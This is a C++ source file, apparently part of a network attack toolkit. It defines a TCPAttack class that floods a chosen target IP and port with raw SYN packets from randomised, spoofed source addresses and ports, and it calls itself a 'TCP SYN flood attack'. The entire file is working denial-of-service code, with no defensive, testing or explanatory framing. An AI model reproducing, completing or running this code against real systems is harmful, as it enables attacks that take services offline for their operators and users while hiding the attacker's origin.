#include "attack/TCPAttack.h"
#include "network/PacketBuilder.h"
#include "network/RawSocket.h"
#include "util/Logger.h"
#include "util/Randomizer.h"
#include <thread>
#include <chrono>

TCPAttack::TCPAttack(const std::string& targetIP, int targetPort, int packetSize, int delayMs)
    : targetIP_(targetIP), targetPort_(targetPort), packetSize_(packetSize), delayMs_(delayMs) {}

TCPAttack::~TCPAttack() {
    stop();
}

void TCPAttack::start() {
    if (running_) return;
    
    running_ = true;
    Logger::getInstance().log(LogLevel::INFO, "Starting TCP attack on " + targetIP_ + ":" + std::to_string(targetPort_));
    
    std::thread([this]() {
        try {
            RawSocket socket(IPPROTO_TCP);
            
            while (running_) {
                // 生成随机源IP和端口
                std::string sourceIP = Randomizer::getInstance().randomIP();
                uint16_t sourcePort = Randomizer::getInstance().randomInt(1024, 65535);
                uint32_t seqNum = Randomizer::getInstance().randomInt(1, 1000000);
                
                auto packet = PacketBuilder::buildTCPPacket(
                    sourceIP, targetIP_, sourcePort, targetPort_, 
                    seqNum, 0, 0x02, // SYN flag
                    std::string(packetSize_, 'A'));
                
                if (!socket.sendPacket(packet)) {
                    Logger::getInstance().log(LogLevel::ERROR, "Failed to send TCP packet");
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(delayMs_));
            }
        } catch (const std::exception& e) {
            Logger::getInstance().log(LogLevel::ERROR, "TCP attack error: " + std::string(e.what()));
            running_ = false;
        }
    }).detach();
}

void TCPAttack::stop() {
    running_ = false;
    Logger::getInstance().log(LogLevel::INFO, "Stopped TCP attack");
}

std::string TCPAttack::getDescription() const {
    return "TCP SYN flood attack targeting " + targetIP_ + ":" + 
           std::to_string(targetPort_) + " with " + 
           std::to_string(packetSize_) + " byte packets";
}